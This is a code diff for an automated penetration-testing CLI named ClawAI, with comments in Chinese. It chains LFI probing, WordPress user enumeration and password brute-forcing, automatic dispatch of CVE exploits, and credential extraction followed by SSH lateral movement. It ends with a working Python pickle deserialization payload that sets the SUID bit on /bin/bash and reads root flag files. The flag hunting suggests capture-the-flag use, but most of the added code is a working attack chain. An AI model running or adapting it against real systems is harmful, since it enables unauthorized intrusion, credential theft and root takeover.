+        _AMBER = "rgb(255,191,0)"
+        _DIM = "rgb(80,110,80)"
+        _CYAN = "rgb(0,212,255)"
+
+        # 收集所有已发现的 PHP 文件（去重）
+        php_files = []
+        for f in all_findings:
+            if f.get("type") == "dir_enum":
+                php_files.extend(f.get("php_files", []))
+
+        # 对 301 重定向目录做 curl 探测，提取目录列表中的 PHP 文件
+        explored_dirs = getattr(self, "_explored_dirs", set())
+        if not hasattr(self, "_explored_dirs"):
+            self._explored_dirs = set()
+
+        for f in all_findings:
+            if f.get("type") == "dir_enum":
+                for dir_url in f.get("dir_paths", []):
+                    if dir_url in explored_dirs:
+                        continue
+                    explored_dirs.add(dir_url)
+                    self._explored_dirs.add(dir_url)
+                    try:
+                        import urllib.request
+                        import re as _re
+                        req = urllib.request.Request(dir_url, headers={"User-Agent": "Mozilla/5.0"})
+                        with urllib.request.urlopen(req, timeout=5) as resp:
+                            html = resp.read().decode("utf-8", errors="ignore")
+                        # 从 Apache 目录列表中提取 href 指向 .php 的链接
+                        php_links = _re.findall(r'href="([^"]+\.php)"', html, _re.I)
+                        for link in php_links:
+                            if link.startswith("http"):
+                                full_url = link
+                            else:
+                                full_url = dir_url.rstrip("/") + "/" + link.lstrip("/")
+                            if full_url not in php_files:
+                                php_files.append(full_url)
+                                console.print(
+                                    Text(f"  [目录探测] ", style=_DIM)
+                                    + Text(f"Apache 目录列表发现 PHP 文件: {full_url}", style=_CYAN)
+                                )
+                    except Exception:
+                        pass
+
+        php_files = list(dict.fromkeys(php_files))  # 去重保序
+
+        if not php_files:
+            return
+
+        # 避免重复测试
+        already_tested = getattr(self, "_lfi_tested_paths", set())
+        new_files = [p for p in php_files if p not in already_tested]
+        if not new_files:
+            return
+
+        if not hasattr(self, "_lfi_tested_paths"):
+            self._lfi_tested_paths = set()
+
+        try:
+            from src.shared.backend.skills.registry import get_skill_registry
+            from src.shared.backend.skills.core import SkillExecutor
+        except ImportError:
+            return
+
+        registry = get_skill_registry()
+        skill = registry.get("lfi_basic")
+        if not skill:
+            return
+
+        executor = SkillExecutor()
+
+        for php_url in new_files[:5]:  # 最多测试 5 个 PHP 文件
+            self._lfi_tested_paths.add(php_url)
+
+            console.print()
+            console.print(
+                Text(f"  [LFI自动] ", style=_DIM)
+                + Text(f"dirsearch 发现 PHP 文件 → 自动 LFI 测试", style=_CYAN)
+            )
+            console.print(Text(f"  [+] 测试: {php_url}", style=_AMBER))
+
+            try:
+                result = await asyncio.to_thread(
+                    executor.execute,
+                    skill,
+                    {"target": php_url, "param": "", "paths": ""},
+                )
+            except Exception as e:
+                continue
+
+            output = result.get("output", "")
+            success = "LFI_FOUND" in output
+
+            if success:
+                console.print(Text(f"  [LFI CONFIRMED]", style=f"bold {_GRN}"))
+                preview = output[:300].replace("\n", " ")
+                console.print(Text(f"    {preview}", style=""))
+                self.session.findings.append({
+                    "type": "lfi",
+                    "tool": "lfi_basic",
+                    "target": php_url,
+                    "vulnerable": True,
+                    "evidence": output[:500],
+                    "output_preview": output[:300],
+                })
+                # 发现 LFI 后不继续测试其他文件
+                break
+            else:
+                console.print(Text(f"  [no lfi]  {php_url}", style=_DIM))
+
+    async def _auto_run_dir_scan(
+        self, target: str, all_findings: list
+    ) -> None:
+        """在 nmap/curl 完成后自动运行 dir_scan 用户技能，补充目录发现。
+
+        触发条件：
+        - dir_scan 技能存在于 SkillRegistry（用户已在 .clawai/skills/ 中定义）
+        - 本次扫描尚未执行过 dir_scan
+
+        发现的路径会追加到 session.findings，供后续指纹引擎和 LFI 测试使用。
+        """
+        _CYAN = "rgb(0,212,255)"
+        _AMBER = "rgb(255,191,0)"
+        _GRN = "rgb(0,255,65)"
+        _DIM = "rgb(80,110,80)"
+
+        try:
+            from src.shared.backend.skills import get_skill_registry
+            from src.shared.backend.skills.core import SkillExecutor
+            from src.shared.backend.skills.context import SkillContext
+        except ImportError:
+            return
+
+        registry = get_skill_registry()
+        skill_obj = registry.get("dir_scan")
+        if skill_obj is None:
+            return  # 用户未定义此技能，静默跳过
+
+        self._dispatched_skills.add("dir_scan")
+
+        # 从已有 findings 中取 HTTP 端口构建扫描目标 URL
+        scan_target = self._build_web_target(target, all_findings)
+
+        console.print()
+        console.print(
+            Text("  [目录扫描] ", style=_DIM)
+            + Text("dir_scan", style="bold " + _CYAN)
+            + Text(f"  → {scan_target}", style=_AMBER)
+        )
+
+        try:
+            ctx = SkillContext.from_session(
+                session_id=self.session.session_id,
+                target=self.session.target,
+                phase=self.session.phase,
+                findings=list(self.session.findings),
+                dispatched_skills=self._dispatched_skills.copy(),
+                metadata={"scan_type": "auto_dir_scan"},
+            )
+            executor = SkillExecutor()
+            result = await asyncio.to_thread(
+                executor.execute,
+                skill_obj,
+                {"target": scan_target, "threads": 10, "timeout": 6},
+                ctx,
+            )
+        except Exception as e:
+            logger.warning(f"dir_scan 执行失败: {e}")
+            console.print(Text(f"  [!] dir_scan 执行失败: {e}", style="rgb(255,60,60)"))
+            return
+
+        output = result.get("output", "")
+        success = result.get("success", False)
+
+        if output:
+            preview = output.strip().replace("\n", "\n    ")
+            console.print(Text(f"    {preview}", style=""))
+
+        # 提取发现的路径，追加到 findings 供后续步骤使用
+        found_paths = []
+        for line in output.splitlines():
+            # 格式：  [200 OK]       http://target/admin  1234B
+            if "[200" in line or "[301" in line or "[302" in line or "[403" in line or "[401" in line:
+                parts = line.split()
+                for part in parts:
+                    if part.startswith("http"):
+                        found_paths.append(part)
+                        break
+
+        finding = {
+            "type": "dir_scan",
+            "tool": "dir_scan",
+            "skill_id": "dir_scan",
+            "target": scan_target,
+            "vulnerable": bool(found_paths),
+            "output_preview": output[:500],
+            "paths": found_paths,
+            "paths_count": len(found_paths),
+        }
+        self.session.findings.append(finding)
+
+        if found_paths:
+            console.print(
+                Text(f"  [+] 发现 {len(found_paths)} 个路径，已加入 findings", style=_GRN)
+            )
+            # 追加指纹再匹配一次，新路径可能命中规则
+            await self._auto_dispatch_cve_skills(self.session.target, self.session.findings)
+        else:
+            console.print(Text("  [-] 未发现敏感路径", style=_DIM))
+
+    async def _auto_detect_wordpress(
+        self, target: str, all_findings: list
+    ) -> None:
+        """从 findings 中检测 WordPress 特征 → 自动运行 wpscan 用户枚举和弱密码扫描"""
+        if "wordpress_scan" in self._dispatched_skills:
+            return
+
+        _GRN = "rgb(0,255,65)"
+        _AMBER = "rgb(255,191,0)"
+        _RED = "rgb(255,60,60)"
+        _DIM = "rgb(80,110,80)"
+
+        # WordPress 特征关键词
+        WP_SIGNALS = [
+            "wp-admin", "wp-login", "wp-content", "wp-includes",
+            "xmlrpc.php", "wordpress", "WordPress", "/?p=",
+            "wp-json", "wlwmanifest", "wp-embed",
+        ]
+
+        # 聚合所有 findings 文本（包括 paths 列表）
+        parts = []
+        for f in all_findings:
+            parts.append(f.get("output_preview") or "")
+            parts.append(f.get("raw") or "")
+            parts.append(f.get("output") or "")
+            parts.append(f.get("title") or "")
+            # dirsearch/dir_scan 发现的路径列表
+            for p in f.get("paths", []):
+                parts.append(str(p) if p is not None else "")
+        combined = " ".join(x for x in parts if x)
+
+        wp_in_findings = any(sig in combined for sig in WP_SIGNALS)
+
+        # 兜底：主动 HTTP 探测 wp-login.php（findings 里可能没有 WordPress 路径）
+        if not wp_in_findings:
+            base_url = self._build_web_target(target, all_findings)
+            try:
+                import urllib.request as _ur
+                _req = _ur.Request(base_url.rstrip("/") + "/wp-login.php")
+                _req.add_header("User-Agent", "Mozilla/5.0")
+                _resp = _ur.urlopen(_req, timeout=5)
+                _body = _resp.read(2000).decode("utf-8", errors="ignore")
+                if "WordPress" in _body or "wp-login" in _body or "log" in _body:
+                    wp_in_findings = True
+            except Exception:
+                pass
+
+        if not wp_in_findings:
+            return
+
+        self._dispatched_skills.add("wordpress_scan")
+        base_url = self._build_web_target(target, all_findings)
+
+        console.print()
+        console.print(
+            Text("  [WordPress] ", style=_AMBER)
+            + Text("检测到 WordPress 站点", style="bold")
+            + Text(f"  → {base_url}", style=_DIM)
+        )
+
+        # 步骤1：wpscan 用户枚举
+        wpscan_enum_cmd = f"wpscan --url {base_url} --enumerate u,vp --no-update --format cli 2>&1 | head -80"
+        console.print(Text(f"  [+] 运行 wpscan 用户枚举...", style=_GRN))
+        try:
+            _wpscan_result = await asyncio.wait_for(
+                self.agent._local_execute_command(wpscan_enum_cmd, target, "wpscan"),
+                timeout=60,
+            )
+            # _local_execute_command returns Tuple[str, dict]
+            wpscan_output = _wpscan_result[0] if isinstance(_wpscan_result, tuple) else str(_wpscan_result)
+        except Exception as e:
+            wpscan_output = f"wpscan error: {e}"
+
+        # 解析用户名
+        import re as _re
+        users_found = _re.findall(r"Username[:\s]+([a-zA-Z0-9_\-\.]+)", wpscan_output or "", _re.IGNORECASE)
+        if not users_found:
+            # 备选：从输出行中提取 | <name> 格式
+            users_found = _re.findall(r"\|\s+([a-zA-Z0-9_\-\.]+)\s+\|", wpscan_output)
+        users_found = list(dict.fromkeys(users_found))[:5]  # 去重，最多5个
+
+        if users_found:
+            console.print(Text(f"  [!] 发现用户: {', '.join(users_found)}", style=_AMBER))
+        else:
+            users_found = ["admin"]  # 默认尝试 admin
+            console.print(Text(f"  [-] 未枚举到用户，默认尝试 admin", style=_DIM))
+
+        # 步骤2：wpscan 弱密码爆破（常见密码 top10）
+        common_passwords = "password,123456,admin,admin123,wordpress,qwerty,letmein,welcome,test,1234"
+        users_str = ",".join(users_found)
+        wpscan_brute_cmd = (
+            f"wpscan --url {base_url} --usernames {users_str} "
+            f"--passwords <(echo -e '{chr(10).join(common_passwords.split(','))}') "
+            f"--no-update --format cli 2>&1 | tail -30"
+        )
+        # 改用内联密码列表方式（兼容性更好）
+        pwd_list = "\n".join(common_passwords.split(","))
+        import tempfile, os
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+                tf.write(pwd_list)
+                tmp_pwd_file = tf.name
+            wpscan_brute_cmd2 = (
+                f"wpscan --url {base_url} --usernames {users_str} "
+                f"--passwords {tmp_pwd_file} --no-update --format cli 2>&1 | tail -30"
+            )
+            console.print(Text(f"  [+] 运行 wpscan 弱密码爆破: {users_str}", style=_GRN))
+            _brute_result = await asyncio.wait_for(
+                self.agent._local_execute_command(wpscan_brute_cmd2, target, "wpscan"),
+                timeout=90,
+            )
+            brute_output = _brute_result[0] if isinstance(_brute_result, tuple) else str(_brute_result)
+        except Exception as e:
+            brute_output = f"wpscan brute error: {e}"
+        finally:
+            try:
+                os.unlink(tmp_pwd_file)
+            except Exception:
+                pass
+
+        # 检测是否爆破成功
+        creds_found = _re.findall(
+            r"Username:\s*([^\s,]+).*?Password:\s*([^\s,\n]+)",
+            brute_output or "", _re.IGNORECASE | _re.DOTALL
+        )
+        if creds_found:
+            for user, pwd in creds_found:
+                console.print(Text(f"  [!!!] 弱密码命中: {user} / {pwd}", style=f"bold {_RED}"))
+            self.session.findings.append({
+                "type": "wordpress_weak_credential",
+                "tool": "wpscan",
+                "vulnerable": True,
+                "evidence": str(creds_found[:3]),
+                "output_preview": brute_output[:300],
+                "target": base_url,
+            })
+        else:
+            console.print(Text(f"  [-] 常见密码爆破未命中", style=_DIM))
+            self.session.findings.append({
+                "type": "wordpress_detected",
+                "tool": "wpscan",
+                "vulnerable": False,
+                "users": users_found,
+                "output_preview": (wpscan_output or "")[:300],
+                "target": base_url,
+            })
+
+        # 注入结果到 agent 历史供后续 planner 参考
+        wp_summary = f"[WordPress检测] 站点: {base_url}\n发现用户: {users_found}\nwpscan输出摘要: {(wpscan_output or '')[:300]}"
+        if hasattr(self, "agent") and self.agent:
+            self.agent.summarized_history += f"\n{wp_summary}"
+
+        # 执行 wordpress_rce skill（用已发现的用户逐一尝试）
+        if "wordpress_rce" not in self._dispatched_skills:
+            self._dispatched_skills.add("wordpress_rce")
+            try:
+                from src.shared.backend.skills.cve_exploit_skills import get_cve_exploit_skills
+                from src.shared.backend.skills.core import SkillExecutor
+
+                skill_registry = {s.id: s for s in get_cve_exploit_skills()}
+                if "wordpress_rce" in skill_registry:
+                    executor = SkillExecutor()
+                    common_passwords = ["qwerty", "admin", "password", "admin123", "wordpress", "123456", "letmein"]
+                    wp_skill = skill_registry["wordpress_rce"]
+                    for user in users_found:
+                        for pwd in common_passwords:
+                            console.print(Text(f"  [WP-RCE] 尝试登录: {user}/{pwd}", style=_DIM))
+                            try:
+                                rce_result = await asyncio.wait_for(
+                                    asyncio.to_thread(
+                                        executor.execute,
+                                        wp_skill,
+                                        {"target": base_url, "username": user, "password": pwd},
+                                    ),
+                                    timeout=30,
+                                )
+                                rce_output = rce_result.get("output", "") if isinstance(rce_result, dict) else str(rce_result)
+                                if "LOGIN_SUCCESS" in rce_output or "RCE_CONFIRMED" in rce_output:
+                                    console.print(Text(f"  [!!!] WordPress RCE 确认! {user}/{pwd}", style=f"bold {_RED}"))
+                                    console.print(Text(f"      {rce_output[:200]}", style=_AMBER))
+                                    self.session.findings.append({
+                                        "type": "wordpress_rce",
+                                        "tool": "wordpress_rce",
+                                        "vulnerable": True,
+                                        "evidence": rce_output[:300],
+                                        "output_preview": rce_output[:300],
+                                        "target": base_url,
+                                        "severity": "critical",
+                                    })
+                                    break
+                            except Exception as e:
+                                logger.debug(f"wordpress_rce skill error: {e}")
+                        else:
+                            continue
+                        break
+            except Exception as e:
+                logger.debug(f"wordpress_rce dispatch error: {e}")
+
+    def _build_web_target(self, target: str, findings: list) -> str:
+        """从 target 和 findings 中推断出 HTTP URL。
+
+        优先用 findings 中 nmap 发现的 HTTP 端口，
+        fallback 到 target 本身（若已是 URL）或 http://target。
+        """
+        import re
+
+        # target 已经是 URL
+        if target.startswith("http://") or target.startswith("https://"):
+            return target
+
+        # 从 nmap findings 中找 HTTP 服务端口
+        for f in findings:
+            output = f.get("output", "") or f.get("output_preview", "") or f.get("raw", "")
+            # nmap 输出格式：80/tcp open http   或  443/tcp open  ssl/http
+            for m in re.finditer(r"(\d+)/tcp\s+open\s+(?:ssl/)?http", output, re.IGNORECASE):
+                port = int(m.group(1))
+                scheme = "https" if port == 443 or "ssl" in m.group(0).lower() else "http"
+                return f"{scheme}://{target}:{port}" if port not in (80, 443) else f"{scheme}://{target}"
+
+        return f"http://{target}"
+
+    async def _auto_dispatch_cve_skills(
+        self, target: str, all_findings: list
+    ) -> None:
+        """指纹识别 → CVE Skill 自动分发
+
+        从已有 findings 中提取服务信息，匹配 fingerprint 规则，
+        对置信度 >= 0.5 且未执行过的 CVE Skill 自动分发并输出结果。
+        """
+        try:
+            from src.shared.backend.skills.fingerprint import match_findings
+            from src.shared.backend.skills.cve_exploit_skills import get_cve_exploit_skills
+            from src.shared.backend.skills.core import SkillExecutor
+            from src.shared.backend.skills.context import SkillContext
+        except ImportError as e:
+            logger.debug(f"指纹模块导入失败（跳过自动分发）: {e}")
+            return
+
+        matches = match_findings(all_findings, base_target=target)
+        if not matches:
+            return
+
+        _CYAN = "rgb(0,212,255)"
+        _AMBER = "rgb(255,191,0)"
+        _GRN = "rgb(0,255,65)"
+        _RED = "rgb(255,60,60)"
+        _DIM = "rgb(80,110,80)"
+
+        executor = SkillExecutor()
+        skill_registry = {s.id: s for s in get_cve_exploit_skills()}
+
+        # Skills that perform internal path probing — can trigger on lower confidence
+        _PROBE_SKILLS = {"fuel_cms_rce", "flask_pickle_rce", "earth_django_rce"}
+
+        # 筛选出本轮需要执行的 skill（过滤已分发、置信度不足的）
+        pending_matches = []
+        for match in matches:
+            skill_id = match.skill_id
+            threshold = 0.25 if skill_id in _PROBE_SKILLS else 0.5
+            if match.confidence < threshold:
+                continue
+            if skill_id in self._dispatched_skills:
+                continue
+            if skill_id not in skill_registry:
+                continue
+            self._dispatched_skills.add(skill_id)
+            pending_matches.append(match)
+
+        if not pending_matches:
+            return
+
+        # 打印所有即将触发的 skill
+        for match in pending_matches:
+            console.print()
+            console.print(
+                Text(f"  [指纹] ", style=_DIM)
+                + Text(f"{match.description}", style=_CYAN)
+                + Text(f"  置信度 {match.confidence:.0%}", style=_AMBER)
+                + Text(f"  → {match.skill_id}", style="bold")
+            )
+            console.print(Text(f"  [+] 自动触发 CVE Skill: {match.skill_id}  目标: {match.target}", style=_AMBER))
+
+        async def _run_one_cve(match):
+            skill_id = match.skill_id
+            try:
+                skill_obj = skill_registry[skill_id]
+                ctx = SkillContext.from_session(
+                    session_id=self.session.session_id,
+                    target=self.session.target,
+                    phase=self.session.phase,
+                    findings=list(self.session.findings),
+                    dispatched_skills=self._dispatched_skills.copy(),
+                    metadata={"scan_type": "auto_cve", "match_confidence": match.confidence},
+                )
+                result = await asyncio.to_thread(
+                    executor.execute,
+                    skill_obj,
+                    {"target": match.target},
+                    ctx,
+                )
+            except Exception as e:
+                logger.warning(f"CVE Skill {skill_id} 执行失败: {e}")
+                console.print(Text(f"  [!] {skill_id} 执行失败: {e}", style=_RED))
+                return None, match
+
+            return result, match
+
+        # 并行执行所有 CVE Skill（最多 4 个同时跑，避免网络请求风暴）
+        MAX_CVE_PARALLEL = 4
+        for i in range(0, len(pending_matches), MAX_CVE_PARALLEL):
+            batch = pending_matches[i:i + MAX_CVE_PARALLEL]
+            batch_results = await asyncio.gather(*[_run_one_cve(m) for m in batch])
+
+            for result, match in batch_results:
+                if result is None:
+                    continue
+                skill_id = match.skill_id
+
+                # 解析 Skill 执行结果
+                success = result.get("success", False)
+                output = result.get("output", result.get("error", ""))
+                evidence = result.get("evidence", "")
+
+                status_style = _GRN if success else _DIM
+                status_label = "[VULN CONFIRMED]" if success else "[not vulnerable / inconclusive]"
+                console.print(Text(f"  {status_label} ({skill_id})", style=f"bold {status_style}"))
+
+                if output:
+                    preview = output[:200].replace("\n", " ")
+                    console.print(Text(f"    {preview}", style=""))
+
+                # 将 CVE Skill 结果追加为 finding
+                self.session.findings.append({
+                    "type": "cve_skill",
+                    "tool": skill_id,
+                    "skill_id": skill_id,
+                    "target": match.target,
+                    "vulnerable": success,
+                    "evidence": evidence or output[:300],
+                    "output_preview": output[:300],
+                    "confidence": match.confidence,
+                    "description": match.description,
+                })
+
+                # ── 后处理：凭据提取 + SSH 横向移动 ──────────────────
+                if success and output:
+                    await self._post_skill_lateral_move(skill_id, match.target, output)
+
+    async def _post_skill_lateral_move(
+        self, skill_id: str, target: str, output: str
+    ) -> None:
+        """CVE Skill 成功后：自动提取凭据并尝试 SSH 横向移动 / 后续 Skill"""
+        import re as _re
+        _CYAN = "rgb(0,212,255)"
+        _AMBER = "rgb(255,191,0)"
+        _GRN = "rgb(0,255,65)"
+        _RED = "rgb(255,60,60)"
+        _DIM = "rgb(80,110,80)"
+
+        # ── 1. 提取数据库/系统凭据 ──────────────────────────────
+        # DB_CONFIG: 'username' => 'anna'  / 'password' => 'H993...'
+        creds: dict = {}
+        for line in output.split("\n"):
+            m = _re.search(r"'username'\s*=>\s*'([^']+)'", line)
+            if m:
+                creds["username"] = m.group(1)
+            m = _re.search(r"'password'\s*=>\s*'([^']+)'", line)
+            if m:
+                creds["password"] = m.group(1)
+            # 通用 CREDENTIALS: user:pass 格式
+            m = _re.search(r"CREDENTIALS:\s*(\S+):(\S+)", line)
+            if m:
+                creds["username"] = m.group(1)
+                creds["password"] = m.group(2)
+
+        if not creds:
+            return
+
+        username = creds.get("username", "")
+        password = creds.get("password", "")
+        if not username or not password:
+            return
+
+        console.print()
+        console.print(
+            Text("  [凭据] ", style=_DIM)
+            + Text(f"发现凭据 ", style=_AMBER)
+            + Text(f"{username}:{password}", style="bold green")
+        )
+
+        # 保存凭据到 session findings
+        self.session.findings.append({
+            "type": "credential",
+            "username": username,
+            "password": password,
+            "source_skill": skill_id,
+            "target": target,
+        })
+
+        # ── 2. 尝试 SSH 横向移动 ────────────────────────────────
+        from urllib.parse import urlparse
+        parsed = urlparse(target if "://" in target else f"http://{target}")
+        host = parsed.hostname or target.split(":")[0]
+        ssh_port = 22
+
+        console.print(
+            Text(f"  [SSH] ", style=_DIM)
+            + Text(f"尝试 SSH 横向移动  {username}@{host}:{ssh_port}", style=_AMBER)
+        )
+
+        ssh_result = await asyncio.to_thread(
+            self._try_ssh_login, host, ssh_port, username, password
+        )
+
+        if ssh_result.get("success"):
+            console.print(Text(f"  [SSH] SSH 登录成功！", style=f"bold {_GRN}"))
+            console.print(Text(f"    {ssh_result.get('output', '')[:200]}", style=""))
+
+            self.session.findings.append({
+                "type": "ssh_access",
+                "host": host,
+                "port": ssh_port,
+                "username": username,
+                "password": password,
+                "uid_info": ssh_result.get("output", ""),
+            })
+
+            # ── 3. 触发后续 Skill（如 Flask Pickle RCE）─────────
+            await self._post_ssh_escalation(host, ssh_port, username, password, target)
+        else:
+            console.print(
+                Text(f"  [SSH] SSH 失败: {ssh_result.get('error','unknown')[:80]}", style=_DIM)
+            )
+
+    def _try_ssh_login(
+        self, host: str, port: int, username: str, password: str
+    ) -> dict:
+        """尝试 SSH 登录并执行 id 命令，返回 {success, output, error}"""
+        # Priority 1: paramiko (pure Python, no external binary issues)
+        try:
+            import paramiko
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(host, port=port, username=username, password=password, timeout=10)
+            _, stdout, _ = client.exec_command("id && uname -a")
+            output = stdout.read().decode("utf-8", errors="ignore").strip()
+            client.close()
+            return {"success": True, "output": output}
+        except ImportError:
+            pass
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+        # Priority 2: plink (if paramiko not available)
+        import subprocess, shutil, os
+        plink = shutil.which("plink") or r"C:\Program Files\PuTTY\plink.exe"
+        if not os.path.exists(plink):
+            return {"success": False, "error": "No SSH client available (paramiko not installed, plink not found)"}
+
+        # Try with -auto-store-sshkey (newer plink) or fall back to registry key
+        cmd = [plink, "-ssh", "-pw", password, "-batch",
+               "-auto-store-sshkey", f"{username}@{host}", "id"]
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+            if "uid=" in r.stdout:
+                return {"success": True, "output": r.stdout.strip()}
+            return {"success": False, "error": (r.stdout + r.stderr)[:200]}
+        except subprocess.TimeoutExpired:
+            return {"success": False, "error": "SSH timeout"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    async def _post_ssh_escalation(
+        self, host: str, port: int, username: str, password: str, original_target: str
+    ) -> None:
+        """SSH 登录成功后，检测并自动执行本地提权 Skill"""
+        import subprocess, shutil, re as _re
+        _GRN = "rgb(0,255,65)"
+        _AMBER = "rgb(255,191,0)"
+        _DIM = "rgb(80,110,80)"
+
+        plink = shutil.which("plink") or r"C:\Program Files\PuTTY\plink.exe"
+        import os
+        if not os.path.exists(plink):
+            return
+
+        def ssh_cmd(command: str) -> str:
+            try:
+                r = subprocess.run(
+                    [plink, "-ssh", "-pw", password, "-batch",
+                     "-auto-store-sshkey", f"{username}@{host}", command],
+                    capture_output=True, text=True, timeout=20
+                )
+                return r.stdout + r.stderr
+            except Exception:
+                return ""
+
+        # 检测 Flask Pickle 漏洞
+        flask_check = ssh_cmd(
+            "ss -tlnp 2>/dev/null | grep 5000 || netstat -tlnp 2>/dev/null | grep 5000"
+        )
+        if "5000" not in flask_check:
+            # Try finding flask process
+            flask_proc = ssh_cmd("ps aux | grep flask | grep -v grep")
+            if "flask" not in flask_proc:
+                return
+
+        # Check if Flask runs as root
+        flask_owner = ssh_cmd("ps aux | grep 'flask run' | grep -v grep | awk '{print $1}'")
+        if "root" in flask_owner:
+            console.print()
+            console.print(
+                Text("  [!] ", style=_DIM)
+                + Text("检测到 Flask 以 root 运行于 5000 端口，尝试 Pickle 反序列化提权", style=_AMBER)
+            )
+
+            # Execute flask_pickle_rce via SSH python3
+            exploit_code = (
+                "python3 -c \""
+                "import pickle,base64,os,urllib.request,urllib.parse;"
+                "class E:pass;"
+                "E.__reduce__=lambda self:(os.system,('chmod +s /bin/bash',));"
+                "p=base64.urlsafe_b64encode(pickle.dumps(E())).decode();"
+                "d=urllib.parse.urlencode({'awesome':p}).encode();"
+                "urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/heaven',d,'POST'))"
+                "\""
+            )
+            pickle_result = ssh_cmd(exploit_code)
+            bash_stat = ssh_cmd("ls -la /bin/bash")
+            if "rws" in bash_stat or "rwsr" in bash_stat:
+                console.print(Text("  [PRIVESC] SUID bash 设置成功！", style=f"bold {_GRN}"))
+                root_id = ssh_cmd("/bin/bash -p -c 'id'")
+                console.print(Text(f"    {root_id.strip()}", style="bold green"))
+                flag = ssh_cmd("/bin/bash -p -c 'cat /root/flag.txt /root/root.txt 2>/dev/null'")
+                if flag.strip():
+                    console.print(Text(f"  [FLAG] {flag.strip()[:200]}", style=f"bold {_GRN}"))
+                    self.session.findings.append({
+                        "type": "flag",
+                        "value": flag.strip(),
+                        "source": "flask_pickle_rce_via_ssh",
+                    })
+            else:
+                console.print(Text(f"  [PRIVESC] Pickle payload 已发送，bash stat: {bash_stat[:80]}", style=_DIM))
 
     def _autosave(self):
         """在关键操作后自动保存会话"""
@@ -1848,3 +3125,6 @@ if __name__ == "__main__":
             print(f"\nClawAI: {response}\n")
 
     asyncio.run(test_chat())
+
+# 向后兼容别名
+ChatCLI = ClawAIChatCLI
